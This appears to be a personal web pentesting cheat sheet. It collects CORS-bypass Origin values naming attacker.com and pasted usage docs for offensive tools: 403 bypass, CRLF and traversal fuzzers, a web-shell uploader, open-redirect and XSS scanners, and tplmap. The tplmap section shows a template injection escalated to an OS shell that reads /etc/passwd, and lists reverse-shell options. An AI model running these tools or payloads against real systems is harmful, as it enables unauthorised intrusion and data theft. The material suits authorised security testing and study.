Connaissances random : 
CORS Bypass
    Origin:null
    Origin:attacker.com
    Origin:attacker.target.com
    Origin:attackertarget.com
    Origin:sub.attackertarget.com
    Origin:attacker.com and then change the method Get to post/Post to Get
    Origin:sub.attacker target.com
    Origin:sub.attacker%target.com
    Origin:attacker.com/target.com



Broken links : 
https://github.com/stevenvachon/broken-link-checker

To install, type this at the command line:
npm install broken-link-checker -g
After that, check out the help for available options:
blc --help
A typical site-wide check might look like:
blc http://yoursite.com -ro
# or
blc path/to/index.html -ro




https://github.com/yunemse48/403bypasser
Usage

Arguments:
Argument 	Description 	Examples 	Note
-u 	single URL to scan 	http://example.com or http://example.com/ 	All these example usages are interpreted in the same way
-U 	path to list of URLs 	./urllist.txt, ../../urllist.txt, etc. 	Just provide the path where the file is located :)
-d 	single directory to scan 	admin or /admin or admin/ or /admin/ 	All these example usages are interpreted in the same way
-D 	path to list of directories 	./dirlist.txt, ../../dirlist.txt, etc. 	Just provide the path where the file is located :)

Usage 1: python3 403bypasser.py -u https://example.com -d /secret
Usage 2: python3 403bypasser.py -u https://example.com -D dirlist.txt
Usage 3: python3 403bypasser.py -U urllist.txt -d /secret
Usage 4: python3 403bypasser.py -U urllist.txt -D dirlist.txt

IMPORTANT NOTE: All the followings are interpreted the same. Therefore, which pattern you use is just a matter of preference.

    python3 403bypasser.py -u https://example.com -d secret
    python3 403bypasser.py -u https://example.com -d /secret
    python3 403bypasser.py -u https://example.com -d /secret/
    python3 403bypasser.py -u https://example.com -d secret/
    python3 403bypasser.py -u https://example.com/ -d secret
    ALL THE SAME!

    Since Python is a cross-platform language, one can run this program on different operating systems.

Output

The output of the program is saved (in the current directory) in a file with the name of the domain name given as input.
For example:
python3 403bypasser.py -u https://example.com -d /secret is given. Then the output is saved to example.txt in the current directory.




A fast tool to scan CRLF vulnerability written in Go
https://github.com/dwisiswant0/crlfuzz
Installation
from Binary
The installation is easy. You can download a prebuilt binary from releases page, unpack and run! or with
▶ curl -sSfL https://git.io/crlfuzz | sh -s -- -b /usr/local/bin
from Source
If you have go1.13+ compiler installed and configured:
▶ GO111MODULE=on go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
In order to update the tool, you can use -u flag with go get command.
from GitHub
▶ git clone https://github.com/dwisiswant0/crlfuzz
▶ cd crlfuzz/cmd/crlfuzz
▶ go build .
▶ mv crlfuzz /usr/local/bin
Usage
Basic Usage
Simply, CRLFuzz can be run with:
▶ crlfuzz -u "http://target"
Flags
▶ crlfuzz -h
This will display help for the tool. Here are all the switches it supports.
Flag 	Description
-u, --url 	Define single URL to fuzz
-l, --list 	Fuzz URLs within file
-X, --method 	Specify request method to use (default: GET)
-o, --output 	File to save results
-d, --data 	Define request data
-H, --header 	Pass custom header to target
-x, --proxy 	Use specified proxy to fuzz
-c, --concurrent 	Set the concurrency level (default: 25)
-s, --silent 	Silent mode
-v, --verbose 	Verbose mode
-V, --version 	Show current CRLFuzz version
-h, --help 	Display its help
Target
You can define a target in 3 ways:
Single URL
▶ crlfuzz -u "http://target"
URLs from list
▶ crlfuzz -l /path/to/urls.txt
from Stdin
In case you want to chained with other tools.
▶ subfinder -d target -silent | httpx -silent | crlfuzz
Method
By default, CRLFuzz makes requests with GET method. If you want to change it, you can use the -X flag.
▶ crlfuzz -u "http://target" -X "GET"
Output
You can also save fuzzing results to a file with -o flag.
▶ crlfuzz -l /path/to/urls.txt -o /path/to/results.txt




# https://github.com/MichaelStott/CRLF-Injection-Scanner
crlf_scan.py -i <inputfile> -o <outputfile>
# https://github.com/dwisiswant0/crlfuzz
crlfuzz -u "http://target"
# https://github.com/ryandamour/crlfmap
crlfmap scan --domains domains.txt --output results.txt





https://www.kali.org/tools/dotdotpwn/
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################
How to install: sudo apt install dotdotpwn
Usage: ./dotdotpwn.pl -m <module> -h <host> [OPTIONS]
	Available options:
	-m	Module [http | http-url | ftp | tftp | payload | stdout]
	-h	Hostname
	-O	Operating System detection for intelligent fuzzing (nmap)
	-o	Operating System type if known ("windows", "unix" or "generic")
	-s	Service version detection (banner grabber)
	-d	Depth of traversals (e.g. deepness 3 equals to ../../../; default: 6)
	-f	Specific filename (e.g. /etc/motd; default: according to OS detected, defaults in TraversalEngine.pm)
	-E	Add @Extra_files in TraversalEngine.pm (e.g. web.config, httpd.conf, etc.)
	-S	Use SSL for HTTP and Payload module (not needed for http-url, use a https:// url instead)
	-u	URL with the part to be fuzzed marked as TRAVERSAL (e.g. http://foo:8080/id.php?x=TRAVERSAL&y=31337)
	-k	Text pattern to match in the response (http-url & payload modules - e.g. "root:" if trying /etc/passwd)
	-p	Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword
	-x	Port to connect (default: HTTP=80; FTP=21; TFTP=69)
	-t	Time in milliseconds between each test (default: 300 (.3 second))
	-X	Use the Bisection Algorithm to detect the exact deepness once a vulnerability has been found
	-e	File extension appended at the end of each fuzz string (e.g. ".php", ".jpg", ".inc")
	-U	Username (default: 'anonymous')
	-P	Password (default: 'dot@dot.pwn')
	-M	HTTP Method to use when using the 'http' module [GET | POST | HEAD | COPY | MOVE] (default: GET)
	-r	Report filename (default: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')
	-b	Break after the first vulnerability is found
	-q	Quiet mode (doesn't print each attempt)
	-C	Continue if no data was received from host
	
	
	
	
	
fuxploider https://github.com/almandin/fuxploider
Fuxploider is an open source penetration testing tool that automates the process of detecting and exploiting file upload forms flaws. This tool is able to detect the file types allowed to be uploaded and is able to detect which technique will work best to upload web shells or any malicious file on the desired web server.
Installation

git clone https://github.com/almandin/fuxploider.git
cd fuxploider
pip3 install -r requirements.txt
Usage

To get a list of basic options and switches use :

python3 fuxploider.py -h

Basic example :

python3 fuxploider.py --url https://awesomeFileUploadService.com --not-regex "wrong file type"





OpenRedireX 
https://github.com/devanshbatham/OpenRedireX
Install

git clone https://github.com/devanshbatham/openredirex
cd openredirex
sudo chmod +x setup.sh
./setup.sh

Usage

The script is executed from the command line and has the following usage options:

openredirex [-p payloads] [-k keyword] [-c concurrency]

    -p, --payloads: File containing a list of payloads. If not specified, a hardcoded list is used.
    -k, --keyword: Keyword in URLs to replace with payload. Default is "FUZZ".
    -c, --concurrency: Number of concurrent tasks. Default is 100.

The script expects a list of URLs as input. Each URL should contain the keyword specified by the -k option. The script replaces the keyword with each of the payloads, and attempts to fetch the modified URL.

Example usage:

cat list_of_urls.txt |  openredirex -p payloads.txt -k "FUZZ" -c 50

List of URLs should look like below:

cat list_of_urls.txt

https://newsroom.example.com/logout?redirect=FUZZ
https://auth.example.com/auth/realms/sonatype/protocol/openid-connect/logout?redirect_uri=test
https://exmaple.com/php?test=baz&foo=bar

This example reads URLs from the file list_of_urls.txt, replaces all the values of the parameters to FUZZ (if --keyword is not supplied), then again replaces the keyword FUZZ or the supplied keyword with each payload from payloads.txt, and fetches each URL concurrently, with a maximum of 50 concurrent tasks.
Dependencies

The script uses the following libraries:

    argparse for handling command-line arguments.
    aiohttp for making HTTP requests.
    tqdm for displaying progress.
    concurrent.futures for handling concurrent tasks.
    asyncio for managing asynchronous tasks.

You need to install these dependencies before running the script. Most of them are part of the standard Python library. You can install aiohttp and tqdm using pip:

pip install aiohttp tqdm






Tplmap https://github.com/epinna/tplmap 
Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.

The tool and its test suite are developed to research the SSTI vulnerability class and to be used as offensive security tool during web application penetration tests.
Exploitation

Tplmap is able to detect and exploit SSTI in a range of template engines to get access to the underlying file system and operating system. Run it against the URL to test if the parameters are vulnerable.

$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files

Use --os-shell option to launch a pseudo-terminal on the target.

$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Run commands on the operating system.

linux $ whoami
www
linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh







XSStrike
Installation

Enter the following commands one by one in terminal:

git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip install -r requirements.txt --break-system-packages

Now, XSStrike can be used at any time as follows:

python xsstrike.py


Main Features

    Reflected and DOM XSS scanning
    Multi-threaded crawling
    Context analysis
    Configurable core
    WAF detection & evasion
    Outdated JS lib scanning
    Intelligent payload generator
    Handmade HTML & JavaScript parser
    Powerful fuzzing engine
    Blind XSS support
    Highly researched work-flow
    Complete HTTP support
    Bruteforce payloads from a file
    Powered by Photon, Zetanize and Arjun
    Payload Encoding


usage: xsstrike.py [-h] [-u TARGET] [--data DATA] [-t THREADS] [--seeds SEEDS] [--json] [--path]
                   [--fuzzer] [--update] [--timeout] [--params] [--crawl] [--blind]
                   [--skip-dom] [--headers] [--proxy] [-d DELAY] [-e ENCODING]

optional arguments:
  -h, --help            show this help message and exit
  -u, --url             target url
  --data                post data
  -f, --file            load payloads from a file
  -t, --threads         number of threads
  -l, --level           level of crawling
  -t, --encode          payload encoding
  --json                treat post data as json
  --path                inject payloads in the path
  --seeds               load urls from a file as seeds
  --fuzzer              fuzzer
  --update              update
  --timeout             timeout
  --params              find params
  --crawl               crawl
  --proxy               use prox(y|ies)
  --blind               inject blind xss payloads while crawling
  --skip                skip confirmation dialogue and poc
  --skip-dom            skip dom checking
  --headers             add headers
  -d, --delay           delay between requests



